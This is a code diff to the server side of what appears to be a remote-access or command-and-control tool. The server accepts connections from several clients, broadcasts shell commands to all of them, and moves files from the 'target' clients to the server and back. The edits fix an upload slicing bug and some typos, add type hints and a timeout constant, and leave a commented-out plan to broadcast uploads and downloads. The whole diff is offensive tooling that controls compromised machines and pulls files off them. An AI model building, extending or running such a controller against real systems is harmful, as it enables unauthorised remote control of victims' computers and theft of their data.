@@ -21,6 +21,7 @@ from prettytable import PrettyTable
 #   4. Encryption implementation
 #   5. Send platform data from client to sever upon request
 #   6. Read global variable values from json file upon flag usage
+#   7. Fix upload / download for broadcast function
 
 SERVER_IP = "0.0.0.0"
 PORT = 1234  # Remote port
@@ -149,7 +150,7 @@ def upload_file(sock: socket.socket, path: str) -> None:
         for segment in data:
             if segment:
                 sock.send(segment)
-    except (FileNotFoundError, IOError):  # Signal: Error when trying tor ead from target file
+    except (FileNotFoundError, IOError):  # Signal: Error when trying to read from target file
         sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
     finally:
         # final result and message from the client side
@@ -237,7 +238,7 @@ def send_msg(sock: socket.socket, command: str) -> None:
         recv_msg(sock, command)
 
 
-def broadcast(command):
+def broadcast(command: str) -> None:
     """
     This function broadcasts a command to all connected clients.
 
@@ -247,6 +248,12 @@ def broadcast(command):
     """
     for client in CLIENTS:
         try:
+            # FIXME
+            # if command[:9] == "download ":  # Download file from all clients
+            #     download_file(client[0], command[9:])
+            # elif command[:7] == "upload ":  # Upload file to all clients
+            #     upload_file(client[0], command[7:])
+            # else:
             print(termcolor.colored(f"[{client[1][0]}:{client[1][1]}]", "yellow"))
             send_msg(client[0], command)
         except Exception as err:
@@ -284,8 +291,8 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
                     os.system('cls' if os.name == 'nt' else 'clear')
                 elif command[:9] == "download ":  # Download specified file from client side to server side
                     download_file(sock, command[9:])
-                elif command[:7] == "upload ":  # Download specified file from server side to client side
-                    upload_file(sock, command[9:])
+                elif command[:7] == "upload ":  # Upload specified file from server side to client side
+                    upload_file(sock, command[7:])
     except ConnectionError as err:  # Socket connection error
         print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
         CLIENTS.remove((sock, addr))
@@ -327,7 +334,7 @@ def accept_new_connections(s: socket.socket) -> None:
     :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     :return: None
     """
-    s.settimeout(1)
+    s.settimeout(TIMEOUT)
     while True:
         try:
             sock, addr = s.accept()
